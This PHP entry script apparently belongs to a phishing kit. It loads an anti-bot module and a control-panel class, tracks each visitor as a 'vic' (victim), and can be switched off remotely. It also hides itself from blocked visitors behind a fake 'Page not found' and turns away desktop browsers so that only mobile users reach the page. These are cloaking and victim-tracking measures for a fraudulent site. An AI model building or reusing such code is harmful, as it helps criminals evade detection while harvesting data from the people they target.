<?php 
require (__DIR__).'/bots/father.php';
$ajaxPath = "../panel/process/processor.php";
require (__DIR__).'/panel/classes/Jeehan.class.php';
$j=new Jeehan();
$block_pc =  $j->getAdmin("block_pc");
$shutdown =  $j->getAdmin("shutdown");

if($shutdown==1){
	exit;
}
 
if(isset($_SESSION['vic'])==""){
	$j->createVic();
}

if($j->isBlocked()){
	echo "Page not found";
	exit;
}


require (__DIR__).'/md.php';
$d = new Mobile_Detect;
if(!$d->isMobile() and $block_pc==1){
	exit(header("location: out.php"));
}

 

?>